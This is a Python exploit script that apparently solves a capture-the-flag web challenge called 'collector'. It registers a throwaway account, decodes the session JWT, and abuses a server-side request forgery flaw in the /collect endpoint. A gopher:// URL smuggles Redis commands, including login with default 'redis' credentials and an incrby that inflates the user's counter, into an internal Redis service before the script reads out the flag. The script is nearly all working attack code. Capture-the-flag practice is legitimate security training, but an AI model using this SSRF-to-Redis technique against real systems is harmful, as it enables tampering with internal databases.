import base64
import sys

import requests as reqs
import string, random, json

base_url = "https://collector.web.ozon-ctf-2025.ru"

s = reqs.Session()

login = ''.join((random.choice(string.ascii_letters+string.digits) for i in range(16)))
password = ''.join((random.choice(string.ascii_letters+string.digits) for i in range(16)))
resp = s.post(f"{base_url}/signup", data=json.dumps({"login": login, "password": password}), headers={"Content-Type": "application/json"})

print("REGISTER:", resp.status_code)
if resp.status_code != 200:
    print("problem with registration: ", resp.status_code, resp.text)
    sys.exit(-1)

auth_jwt = resp.cookies['token']
print("JWT:", auth_jwt)
auth_jwt_body = auth_jwt.split(".")[1]+"===="
print("JWT body:", auth_jwt_body)
decoded_jwt_body = base64.b64decode(auth_jwt_body).decode()
user_data = json.loads(decoded_jwt_body)

redis_cmd = f"""
auth redis redis
incrby user:{user_data['id']}_{user_data['login']}:url_counter 1000000000000
quit
"""

redis_cmd_encoded = redis_cmd.replace('\r','').replace('\n','%0D%0A').replace(' ','%20').replace(":", '%3A')
payload = json.dumps({
    # "url": f"gopher://127.0.0.1:6379/_{redis_cmd_encoded}"
    "url": f"gopher://redis:6379/_{redis_cmd_encoded}"
})
print("EXPLOIT:",payload)
resp = s.post(f"{base_url}/collect", data=payload, headers={"Content-Type": "application/json"})
print("EXPLOIT RESP:", resp.text)

resp = s.get(f"{base_url}/collect")
print("FLAG:", resp.text[resp.text.index("ozonctf"):resp.text.index("ozonctf")+72])


